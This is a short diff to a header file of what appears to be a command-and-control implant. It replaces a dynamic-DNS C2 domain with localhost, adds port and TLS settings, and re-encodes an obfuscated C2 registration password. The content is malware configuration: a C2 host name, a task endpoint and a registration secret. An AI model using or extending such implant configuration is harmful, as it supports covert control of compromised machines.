@@ -6,8 +6,10 @@
 #endif
 
 #define CONTENT_TYPE_JSON L"Content-Type: application/json"
-#define C2_URL L"kjh2iur80in12rjfbjn.ddns.net"
+#define C2_URL L"localhost"
+#define C2_PORT 80
 #define TASK_RESULTS_ENDPOINT L"/c2/task"
-#define C2_REGISTER_PASSWORD OBFUSCATED("IhylxF8CXAauMoJGuSoF0VEVl4nwTEhw")
+#define C2_REGISTER_PASSWORD OBFUSCATED("SWh5bHhGOENYQWF1TW9KR3VTb0YwVkVWbDRud1RFaHc=")
+#define USE_TLS FALSE
 
 #endif // CONSTANTS_H_
